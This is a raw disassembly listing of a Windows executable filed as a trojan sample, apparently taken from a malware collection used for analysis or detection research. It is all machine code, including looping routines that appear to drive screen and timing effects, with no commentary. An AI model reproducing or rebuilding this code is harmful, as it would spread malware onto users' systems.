
malware_samples/trojan/0fc8a3a76466df9ef2532bf601c7adec07457bcc05caeaf36e94380ca4363422.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 0d 15 73 00 00 	lea    0x7315(%rip),%rcx        # 0x14000831c
   140001007:	e9 a0 64 00 00       	jmp    0x1400074ac
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	48 8d 05 71 d9 00 00 	lea    0xd971(%rip),%rax        # 0x14000e988
   140001017:	c3                   	ret
   140001018:	cc                   	int3
   140001019:	cc                   	int3
   14000101a:	cc                   	int3
   14000101b:	cc                   	int3
   14000101c:	cc                   	int3
   14000101d:	cc                   	int3
   14000101e:	cc                   	int3
   14000101f:	cc                   	int3
   140001020:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001025:	57                   	push   %rdi
   140001026:	48 83 ec 20          	sub    $0x20,%rsp
   14000102a:	48 8b d9             	mov    %rcx,%rbx
   14000102d:	ff 15 a5 81 00 00    	call   *0x81a5(%rip)        # 0x1400091d8
   140001033:	48 8b f8             	mov    %rax,%rdi
   140001036:	ff 15 fc 81 00 00    	call   *0x81fc(%rip)        # 0x140009238
   14000103c:	4c 8b c8             	mov    %rax,%r9
   14000103f:	48 81 ff 80 96 98 00 	cmp    $0x989680,%rdi
   140001046:	75 15                	jne    0x14000105d
   140001048:	49 6b c1 64          	imul   $0x64,%r9,%rax
   14000104c:	48 89 03             	mov    %rax,(%rbx)
   14000104f:	48 8b c3             	mov    %rbx,%rax
   140001052:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001057:	48 83 c4 20          	add    $0x20,%rsp
   14000105b:	5f                   	pop    %rdi
   14000105c:	c3                   	ret
   14000105d:	48 81 ff 00 36 6e 01 	cmp    $0x16e3600,%rdi
   140001064:	75 65                	jne    0x1400010cb
   140001066:	49 ba f3 8c 90 94 07 	movabs $0xb2f4fc0794908cf3,%r10
   14000106d:	fc f4 b2 
   140001070:	49 8b c2             	mov    %r10,%rax
   140001073:	49 f7 e9             	imul   %r9
   140001076:	49 8b c2             	mov    %r10,%rax
   140001079:	4d 8d 04 11          	lea    (%r9,%rdx,1),%r8
   14000107d:	49 c1 f8 18          	sar    $0x18,%r8
   140001081:	49 8b c8             	mov    %r8,%rcx
   140001084:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140001088:	4c 03 c1             	add    %rcx,%r8
   14000108b:	49 69 c8 00 36 6e 01 	imul   $0x16e3600,%r8,%rcx
   140001092:	4c 2b c9             	sub    %rcx,%r9
   140001095:	49 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%r9,%rcx
   14000109c:	48 f7 e9             	imul   %rcx
   14000109f:	48 03 d1             	add    %rcx,%rdx
   1400010a2:	48 c1 fa 18          	sar    $0x18,%rdx
   1400010a6:	48 8b c2             	mov    %rdx,%rax
   1400010a9:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400010ad:	48 03 d0             	add    %rax,%rdx
   1400010b0:	49 69 c0 00 ca 9a 3b 	imul   $0x3b9aca00,%r8,%rax
   1400010b7:	48 03 d0             	add    %rax,%rdx
   1400010ba:	48 8b c3             	mov    %rbx,%rax
   1400010bd:	48 89 13             	mov    %rdx,(%rbx)
   1400010c0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010c5:	48 83 c4 20          	add    $0x20,%rsp
   1400010c9:	5f                   	pop    %rdi
   1400010ca:	c3                   	ret
   1400010cb:	48 99                	cqto
   1400010cd:	48 f7 ff             	idiv   %rdi
   1400010d0:	48 8b c8             	mov    %rax,%rcx
   1400010d3:	48 69 c2 00 ca 9a 3b 	imul   $0x3b9aca00,%rdx,%rax
   1400010da:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   1400010e1:	48 99                	cqto
   1400010e3:	48 f7 ff             	idiv   %rdi
   1400010e6:	48 03 c1             	add    %rcx,%rax
   1400010e9:	48 89 03             	mov    %rax,(%rbx)
   1400010ec:	48 8b c3             	mov    %rbx,%rax
   1400010ef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010f4:	48 83 c4 20          	add    $0x20,%rsp
   1400010f8:	5f                   	pop    %rdi
   1400010f9:	c3                   	ret
   1400010fa:	cc                   	int3
   1400010fb:	cc                   	int3
   1400010fc:	cc                   	int3
   1400010fd:	cc                   	int3
   1400010fe:	cc                   	int3
   1400010ff:	cc                   	int3
   140001100:	40 53                	rex push %rbx
   140001102:	48 83 ec 20          	sub    $0x20,%rsp
   140001106:	48 8b d9             	mov    %rcx,%rbx
   140001109:	48 8b c2             	mov    %rdx,%rax
   14000110c:	48 8d 0d 55 86 00 00 	lea    0x8655(%rip),%rcx        # 0x140009768
   140001113:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001116:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000111a:	48 89 0b             	mov    %rcx,(%rbx)
   14000111d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001121:	0f 11 02             	movups %xmm0,(%rdx)
   140001124:	ff 15 ee 82 00 00    	call   *0x82ee(%rip)        # 0x140009418
   14000112a:	48 8b c3             	mov    %rbx,%rax
   14000112d:	48 83 c4 20          	add    $0x20,%rsp
   140001131:	5b                   	pop    %rbx
   140001132:	c3                   	ret
   140001133:	cc                   	int3
   140001134:	cc                   	int3
   140001135:	cc                   	int3
   140001136:	cc                   	int3
   140001137:	cc                   	int3
   140001138:	cc                   	int3
   140001139:	cc                   	int3
   14000113a:	cc                   	int3
   14000113b:	cc                   	int3
   14000113c:	cc                   	int3
   14000113d:	cc                   	int3
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001144:	48 8d 05 6d 86 00 00 	lea    0x866d(%rip),%rax        # 0x1400097b8
   14000114b:	48 85 d2             	test   %rdx,%rdx
   14000114e:	48 0f 45 c2          	cmovne %rdx,%rax
   140001152:	c3                   	ret
   140001153:	cc                   	int3
   140001154:	cc                   	int3
   140001155:	cc                   	int3
   140001156:	cc                   	int3
   140001157:	cc                   	int3
   140001158:	cc                   	int3
   140001159:	cc                   	int3
   14000115a:	cc                   	int3
   14000115b:	cc                   	int3
   14000115c:	cc                   	int3
   14000115d:	cc                   	int3
   14000115e:	cc                   	int3
   14000115f:	cc                   	int3
   140001160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001165:	57                   	push   %rdi
   140001166:	48 83 ec 20          	sub    $0x20,%rsp
   14000116a:	48 8d 05 f7 85 00 00 	lea    0x85f7(%rip),%rax        # 0x140009768
   140001171:	48 8b f9             	mov    %rcx,%rdi
   140001174:	48 89 01             	mov    %rax,(%rcx)
   140001177:	8b da                	mov    %edx,%ebx
   140001179:	48 83 c1 08          	add    $0x8,%rcx
   14000117d:	ff 15 9d 82 00 00    	call   *0x829d(%rip)        # 0x140009420
   140001183:	f6 c3 01             	test   $0x1,%bl
   140001186:	74 0d                	je     0x140001195
   140001188:	ba 18 00 00 00       	mov    $0x18,%edx
   14000118d:	48 8b cf             	mov    %rdi,%rcx
   140001190:	e8 4b 5d 00 00       	call   0x140006ee0
   140001195:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000119a:	48 8b c7             	mov    %rdi,%rax
   14000119d:	48 83 c4 20          	add    $0x20,%rsp
   1400011a1:	5f                   	pop    %rdi
   1400011a2:	c3                   	ret
   1400011a3:	cc                   	int3
   1400011a4:	cc                   	int3
   1400011a5:	cc                   	int3
   1400011a6:	cc                   	int3
   1400011a7:	cc                   	int3
   1400011a8:	cc                   	int3
   1400011a9:	cc                   	int3
   1400011aa:	cc                   	int3
   1400011ab:	cc                   	int3
   1400011ac:	cc                   	int3
   1400011ad:	cc                   	int3
   1400011ae:	cc                   	int3
   1400011af:	cc                   	int3
   1400011b0:	48 8d 05 b1 85 00 00 	lea    0x85b1(%rip),%rax        # 0x140009768
   1400011b7:	48 89 01             	mov    %rax,(%rcx)
   1400011ba:	48 83 c1 08          	add    $0x8,%rcx
   1400011be:	48 ff 25 5b 82 00 00 	rex.W jmp *0x825b(%rip)        # 0x140009420
   1400011c5:	cc                   	int3
   1400011c6:	cc                   	int3
   1400011c7:	cc                   	int3
   1400011c8:	cc                   	int3
   1400011c9:	cc                   	int3
   1400011ca:	cc                   	int3
   1400011cb:	cc                   	int3
   1400011cc:	cc                   	int3
   1400011cd:	cc                   	int3
   1400011ce:	cc                   	int3
   1400011cf:	cc                   	int3
   1400011d0:	48 8d 05 f9 85 00 00 	lea    0x85f9(%rip),%rax        # 0x1400097d0
   1400011d7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400011de:	00 
   1400011df:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400011e3:	48 8d 05 be 85 00 00 	lea    0x85be(%rip),%rax        # 0x1400097a8
   1400011ea:	48 89 01             	mov    %rax,(%rcx)
   1400011ed:	48 8b c1             	mov    %rcx,%rax
   1400011f0:	c3                   	ret
   1400011f1:	cc                   	int3
   1400011f2:	cc                   	int3
   1400011f3:	cc                   	int3
   1400011f4:	cc                   	int3
   1400011f5:	cc                   	int3
   1400011f6:	cc                   	int3
   1400011f7:	cc                   	int3
   1400011f8:	cc                   	int3
   1400011f9:	cc                   	int3
   1400011fa:	cc                   	int3
   1400011fb:	cc                   	int3
   1400011fc:	cc                   	int3
   1400011fd:	cc                   	int3
   1400011fe:	cc                   	int3
   1400011ff:	cc                   	int3
   140001200:	48 8d 05 e1 85 00 00 	lea    0x85e1(%rip),%rax        # 0x1400097e8
   140001207:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000120e:	00 
   14000120f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001213:	48 8d 05 fe 8e 00 00 	lea    0x8efe(%rip),%rax        # 0x14000a118
   14000121a:	48 89 01             	mov    %rax,(%rcx)
   14000121d:	48 8b c1             	mov    %rcx,%rax
   140001220:	c3                   	ret
   140001221:	cc                   	int3
   140001222:	cc                   	int3
   140001223:	cc                   	int3
   140001224:	cc                   	int3
   140001225:	cc                   	int3
   140001226:	cc                   	int3
   140001227:	cc                   	int3
   140001228:	cc                   	int3
   140001229:	cc                   	int3
   14000122a:	cc                   	int3
   14000122b:	cc                   	int3
   14000122c:	cc                   	int3
   14000122d:	cc                   	int3
   14000122e:	cc                   	int3
   14000122f:	cc                   	int3
   140001230:	48 83 ec 48          	sub    $0x48,%rsp
   140001234:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001239:	e8 c2 ff ff ff       	call   0x140001200
   14000123e:	48 8d 15 73 a7 00 00 	lea    0xa773(%rip),%rdx        # 0x14000b9b8
   140001245:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000124a:	e8 cd 6b 00 00       	call   0x140007e1c
   14000124f:	cc                   	int3
   140001250:	40 53                	rex push %rbx
   140001252:	48 83 ec 20          	sub    $0x20,%rsp
   140001256:	48 8b d9             	mov    %rcx,%rbx
   140001259:	48 8b c2             	mov    %rdx,%rax
   14000125c:	48 8d 0d 05 85 00 00 	lea    0x8505(%rip),%rcx        # 0x140009768
   140001263:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001266:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000126a:	48 89 0b             	mov    %rcx,(%rbx)
   14000126d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001271:	0f 11 02             	movups %xmm0,(%rdx)
   140001274:	ff 15 9e 81 00 00    	call   *0x819e(%rip)        # 0x140009418
   14000127a:	48 8d 05 97 8e 00 00 	lea    0x8e97(%rip),%rax        # 0x14000a118
   140001281:	48 89 03             	mov    %rax,(%rbx)
   140001284:	48 8b c3             	mov    %rbx,%rax
   140001287:	48 83 c4 20          	add    $0x20,%rsp
   14000128b:	5b                   	pop    %rbx
   14000128c:	c3                   	ret
   14000128d:	cc                   	int3
   14000128e:	cc                   	int3
   14000128f:	cc                   	int3
   140001290:	48 83 ec 48          	sub    $0x48,%rsp
   140001294:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001299:	e8 32 ff ff ff       	call   0x1400011d0
   14000129e:	48 8d 15 d3 a7 00 00 	lea    0xa7d3(%rip),%rdx        # 0x14000ba78
   1400012a5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400012aa:	e8 6d 6b 00 00       	call   0x140007e1c
   1400012af:	cc                   	int3
   1400012b0:	40 53                	rex push %rbx
   1400012b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012b6:	48 8b d9             	mov    %rcx,%rbx
   1400012b9:	48 8b c2             	mov    %rdx,%rax
   1400012bc:	48 8d 0d a5 84 00 00 	lea    0x84a5(%rip),%rcx        # 0x140009768
   1400012c3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400012c6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400012ca:	48 89 0b             	mov    %rcx,(%rbx)
   1400012cd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400012d1:	0f 11 02             	movups %xmm0,(%rdx)
   1400012d4:	ff 15 3e 81 00 00    	call   *0x813e(%rip)        # 0x140009418
   1400012da:	48 8d 05 c7 84 00 00 	lea    0x84c7(%rip),%rax        # 0x1400097a8
   1400012e1:	48 89 03             	mov    %rax,(%rbx)
   1400012e4:	48 8b c3             	mov    %rbx,%rax
   1400012e7:	48 83 c4 20          	add    $0x20,%rsp
   1400012eb:	5b                   	pop    %rbx
   1400012ec:	c3                   	ret
   1400012ed:	cc                   	int3
   1400012ee:	cc                   	int3
   1400012ef:	cc                   	int3
   1400012f0:	40 53                	rex push %rbx
   1400012f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012f6:	48 8b d9             	mov    %rcx,%rbx
   1400012f9:	48 8b c2             	mov    %rdx,%rax
   1400012fc:	48 8d 0d 65 84 00 00 	lea    0x8465(%rip),%rcx        # 0x140009768
   140001303:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001306:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000130a:	48 89 0b             	mov    %rcx,(%rbx)
   14000130d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001311:	0f 11 02             	movups %xmm0,(%rdx)
   140001314:	ff 15 fe 80 00 00    	call   *0x80fe(%rip)        # 0x140009418
   14000131a:	48 8d 05 5f 84 00 00 	lea    0x845f(%rip),%rax        # 0x140009780
   140001321:	48 89 03             	mov    %rax,(%rbx)
   140001324:	48 8b c3             	mov    %rbx,%rax
   140001327:	48 83 c4 20          	add    $0x20,%rsp
   14000132b:	5b                   	pop    %rbx
   14000132c:	c3                   	ret
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001335:	57                   	push   %rdi
   140001336:	48 83 ec 20          	sub    $0x20,%rsp
   14000133a:	48 8b 19             	mov    (%rcx),%rbx
   14000133d:	48 8b f9             	mov    %rcx,%rdi
   140001340:	48 85 db             	test   %rbx,%rbx
   140001343:	74 4e                	je     0x140001393
   140001345:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000134a:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000134f:	83 f8 01             	cmp    $0x1,%eax
   140001352:	75 38                	jne    0x14000138c
   140001354:	48 8b 0b             	mov    (%rbx),%rcx
   140001357:	48 85 c9             	test   %rcx,%rcx
   14000135a:	74 0d                	je     0x140001369
   14000135c:	ff 15 5e 7f 00 00    	call   *0x7f5e(%rip)        # 0x1400092c0
   140001362:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140001369:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000136d:	48 85 c9             	test   %rcx,%rcx
   140001370:	74 0d                	je     0x14000137f
   140001372:	e8 69 5b 00 00       	call   0x140006ee0
   140001377:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   14000137e:	00 
   14000137f:	ba 18 00 00 00       	mov    $0x18,%edx
   140001384:	48 8b cb             	mov    %rbx,%rcx
   140001387:	e8 54 5b 00 00       	call   0x140006ee0
   14000138c:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   140001393:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001398:	48 83 c4 20          	add    $0x20,%rsp
   14000139c:	5f                   	pop    %rdi
   14000139d:	c3                   	ret
   14000139e:	cc                   	int3
   14000139f:	cc                   	int3
   1400013a0:	48 ff 25 01 7f 00 00 	rex.W jmp *0x7f01(%rip)        # 0x1400092a8
   1400013a7:	cc                   	int3
   1400013a8:	cc                   	int3
   1400013a9:	cc                   	int3
   1400013aa:	cc                   	int3
   1400013ab:	cc                   	int3
   1400013ac:	cc                   	int3
   1400013ad:	cc                   	int3
   1400013ae:	cc                   	int3
   1400013af:	cc                   	int3
   1400013b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013b4:	48 8d 0d 3d 84 00 00 	lea    0x843d(%rip),%rcx        # 0x1400097f8
   1400013bb:	ff 15 5f 7e 00 00    	call   *0x7e5f(%rip)        # 0x140009220
   1400013c1:	cc                   	int3
   1400013c2:	cc                   	int3
   1400013c3:	cc                   	int3
   1400013c4:	cc                   	int3
   1400013c5:	cc                   	int3
   1400013c6:	cc                   	int3
   1400013c7:	cc                   	int3
   1400013c8:	cc                   	int3
   1400013c9:	cc                   	int3
   1400013ca:	cc                   	int3
   1400013cb:	cc                   	int3
   1400013cc:	cc                   	int3
   1400013cd:	cc                   	int3
   1400013ce:	cc                   	int3
   1400013cf:	cc                   	int3
   1400013d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013d4:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400013d8:	48 85 c9             	test   %rcx,%rcx
   1400013db:	74 20                	je     0x1400013fd
   1400013dd:	48 8b 01             	mov    (%rcx),%rax
   1400013e0:	ff 50 10             	call   *0x10(%rax)
   1400013e3:	48 85 c0             	test   %rax,%rax
   1400013e6:	74 15                	je     0x1400013fd
   1400013e8:	48 8b 08             	mov    (%rax),%rcx
   1400013eb:	ba 01 00 00 00       	mov    $0x1,%edx
   1400013f0:	4c 8b 01             	mov    (%rcx),%r8
   1400013f3:	48 8b c8             	mov    %rax,%rcx
   1400013f6:	48 83 c4 28          	add    $0x28,%rsp
   1400013fa:	49 ff e0             	rex.WB jmp *%r8
   1400013fd:	48 83 c4 28          	add    $0x28,%rsp
   140001401:	c3                   	ret
   140001402:	cc                   	int3
   140001403:	cc                   	int3
   140001404:	cc                   	int3
   140001405:	cc                   	int3
   140001406:	cc                   	int3
   140001407:	cc                   	int3
   140001408:	cc                   	int3
   140001409:	cc                   	int3
   14000140a:	cc                   	int3
   14000140b:	cc                   	int3
   14000140c:	cc                   	int3
   14000140d:	cc                   	int3
   14000140e:	cc                   	int3
   14000140f:	cc                   	int3
   140001410:	40 57                	rex push %rdi
   140001412:	48 83 ec 60          	sub    $0x60,%rsp
   140001416:	33 c9                	xor    %ecx,%ecx
   140001418:	ff 15 2a 7f 00 00    	call   *0x7f2a(%rip)        # 0x140009348
   14000141e:	80 3d 8f cc 00 00 00 	cmpb   $0x0,0xcc8f(%rip)        # 0x14000e0b4
   140001425:	48 8b f8             	mov    %rax,%rdi
   140001428:	0f 84 c4 00 00 00    	je     0x1400014f2
   14000142e:	48 89 9c 24 80 00 00 	mov    %rbx,0x80(%rsp)
   140001435:	00 
   140001436:	48 89 ac 24 88 00 00 	mov    %rbp,0x88(%rsp)
   14000143d:	00 
   14000143e:	33 ed                	xor    %ebp,%ebp
   140001440:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001445:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   14000144c:	ff ff 7f 
   14000144f:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140001454:	49 be ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%r14
   14000145b:	ff ff 7f 
   14000145e:	66 90                	xchg   %ax,%ax
   140001460:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001465:	ff 15 05 7f 00 00    	call   *0x7f05(%rip)        # 0x140009370
   14000146b:	33 c9                	xor    %ecx,%ecx
   14000146d:	8b d8                	mov    %eax,%ebx
   14000146f:	ff 15 fb 7e 00 00    	call   *0x7efb(%rip)        # 0x140009370
   140001475:	c7 44 24 40 08 00 33 	movl   $0x330008,0x40(%rsp)
   14000147c:	00 
   14000147d:	45 33 c0             	xor    %r8d,%r8d
   140001480:	89 6c 24 38          	mov    %ebp,0x38(%rsp)
   140001484:	44 8b c8             	mov    %eax,%r9d
   140001487:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   14000148b:	33 d2                	xor    %edx,%edx
   14000148d:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001492:	48 8b cf             	mov    %rdi,%rcx
   140001495:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001499:	ff 15 b1 7b 00 00    	call   *0x7bb1(%rip)        # 0x140009050
   14000149f:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400014a4:	e8 77 fb ff ff       	call   0x140001020
   1400014a9:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400014ae:	49 3b c6             	cmp    %r14,%rax
   1400014b1:	7d 0d                	jge    0x1400014c0
   1400014b3:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   1400014b9:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400014be:	eb 05                	jmp    0x1400014c5
   1400014c0:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
   1400014c5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400014ca:	e8 c1 4b 00 00       	call   0x140006090
   1400014cf:	40 38 2d de cb 00 00 	cmp    %bpl,0xcbde(%rip)        # 0x14000e0b4
   1400014d6:	75 88                	jne    0x140001460
   1400014d8:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   1400014dd:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400014e2:	48 8b ac 24 88 00 00 	mov    0x88(%rsp),%rbp
   1400014e9:	00 
   1400014ea:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400014f1:	00 
   1400014f2:	48 8b d7             	mov    %rdi,%rdx
   1400014f5:	33 c9                	xor    %ecx,%ecx
   1400014f7:	48 83 c4 60          	add    $0x60,%rsp
   1400014fb:	5f                   	pop    %rdi
   1400014fc:	48 ff 25 15 7e 00 00 	rex.W jmp *0x7e15(%rip)        # 0x140009318
   140001503:	cc                   	int3
   140001504:	cc                   	int3
   140001505:	cc                   	int3
   140001506:	cc                   	int3
   140001507:	cc                   	int3
   140001508:	cc                   	int3
   140001509:	cc                   	int3
   14000150a:	cc                   	int3
   14000150b:	cc                   	int3
   14000150c:	cc                   	int3
   14000150d:	cc                   	int3
   14000150e:	cc                   	int3
   14000150f:	cc                   	int3
   140001510:	40 56                	rex push %rsi
   140001512:	57                   	push   %rdi
   140001513:	48 83 ec 28          	sub    $0x28,%rsp
   140001517:	33 c9                	xor    %ecx,%ecx
   140001519:	ff 15 51 7e 00 00    	call   *0x7e51(%rip)        # 0x140009370
   14000151f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001524:	8b f8                	mov    %eax,%edi
   140001526:	ff 15 44 7e 00 00    	call   *0x7e44(%rip)        # 0x140009370
   14000152c:	80 3d 81 cb 00 00 00 	cmpb   $0x0,0xcb81(%rip)        # 0x14000e0b4
   140001533:	8b f0                	mov    %eax,%esi
   140001535:	0f 84 89 00 00 00    	je     0x1400015c4
   14000153b:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001540:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001545:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   14000154c:	ff ff 7f 
   14000154f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001554:	49 be ff 5c 1e ee ff 	movabs $0x7fffffffee1e5cff,%r14
   14000155b:	ff ff 7f 
   14000155e:	66 90                	xchg   %ax,%ax
   140001560:	ff 15 9a 80 00 00    	call   *0x809a(%rip)        # 0x140009600
   140001566:	99                   	cltd
   140001567:	f7 ff                	idiv   %edi
   140001569:	8b da                	mov    %edx,%ebx
   14000156b:	ff 15 8f 80 00 00    	call   *0x808f(%rip)        # 0x140009600
   140001571:	99                   	cltd
   140001572:	8b cb                	mov    %ebx,%ecx
   140001574:	f7 fe                	idiv   %esi
   140001576:	ff 15 a4 7d 00 00    	call   *0x7da4(%rip)        # 0x140009320
   14000157c:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001581:	e8 9a fa ff ff       	call   0x140001020
   140001586:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000158b:	49 3b c6             	cmp    %r14,%rax
   14000158e:	7d 0d                	jge    0x14000159d
   140001590:	48 05 00 a3 e1 11    	add    $0x11e1a300,%rax
   140001596:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000159b:	eb 05                	jmp    0x1400015a2
   14000159d:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   1400015a2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400015a7:	e8 e4 4a 00 00       	call   0x140006090
   1400015ac:	80 3d 01 cb 00 00 00 	cmpb   $0x0,0xcb01(%rip)        # 0x14000e0b4
   1400015b3:	75 ab                	jne    0x140001560
   1400015b5:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   1400015ba:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400015bf:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400015c4:	48 83 c4 28          	add    $0x28,%rsp
   1400015c8:	5f                   	pop    %rdi
   1400015c9:	5e                   	pop    %rsi
   1400015ca:	c3                   	ret
   1400015cb:	cc                   	int3
   1400015cc:	cc                   	int3
   1400015cd:	cc                   	int3
   1400015ce:	cc                   	int3
   1400015cf:	cc                   	int3
   1400015d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400015d4:	80 3d d9 ca 00 00 00 	cmpb   $0x0,0xcad9(%rip)        # 0x14000e0b4
   1400015db:	0f 84 94 00 00 00    	je     0x140001675
   1400015e1:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400015e6:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400015ed:	ff ff 7f 
   1400015f0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400015f5:	48 bf ff d8 46 d6 ff 	movabs $0x7fffffffd646d8ff,%rdi
   1400015fc:	ff ff 7f 
   1400015ff:	90                   	nop
   140001600:	ff 15 fa 7f 00 00    	call   *0x7ffa(%rip)        # 0x140009600
   140001606:	8b c8                	mov    %eax,%ecx
   140001608:	b8 f1 19 76 05       	mov    $0x57619f1,%eax
   14000160d:	f7 e9                	imul   %ecx
   14000160f:	c1 fa 05             	sar    $0x5,%edx
   140001612:	8b c2                	mov    %edx,%eax
   140001614:	c1 e8 1f             	shr    $0x1f,%eax
   140001617:	03 d0                	add    %eax,%edx
   140001619:	69 c2 dc 05 00 00    	imul   $0x5dc,%edx,%eax
   14000161f:	ba c8 00 00 00       	mov    $0xc8,%edx
   140001624:	2b c8                	sub    %eax,%ecx
   140001626:	81 c1 f4 01 00 00    	add    $0x1f4,%ecx
   14000162c:	ff 15 56 7a 00 00    	call   *0x7a56(%rip)        # 0x140009088
   140001632:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001637:	e8 e4 f9 ff ff       	call   0x140001020
   14000163c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001641:	48 3b c7             	cmp    %rdi,%rax
   140001644:	7d 0d                	jge    0x140001653
   140001646:	48 05 00 27 b9 29    	add    $0x29b92700,%rax
   14000164c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001651:	eb 05                	jmp    0x140001658
   140001653:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001658:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000165d:	e8 2e 4a 00 00       	call   0x140006090
   140001662:	80 3d 4b ca 00 00 00 	cmpb   $0x0,0xca4b(%rip)        # 0x14000e0b4
   140001669:	75 95                	jne    0x140001600
   14000166b:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001670:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001675:	48 83 c4 28          	add    $0x28,%rsp
   140001679:	c3                   	ret
   14000167a:	cc                   	int3
   14000167b:	cc                   	int3
   14000167c:	cc                   	int3
   14000167d:	cc                   	int3
   14000167e:	cc                   	int3
   14000167f:	cc                   	int3
   140001680:	48 83 ec 28          	sub    $0x28,%rsp
   140001684:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001689:	ff 15 99 7c 00 00    	call   *0x7c99(%rip)        # 0x140009328
   14000168f:	80 3d 1e ca 00 00 00 	cmpb   $0x0,0xca1e(%rip)        # 0x14000e0b4
   140001696:	74 61                	je     0x1400016f9
   140001698:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000169d:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400016a4:	ff ff 7f 
   1400016a7:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400016ac:	48 bf ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rdi
   1400016b3:	ff ff 7f 
   1400016b6:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400016bb:	e8 60 f9 ff ff       	call   0x140001020
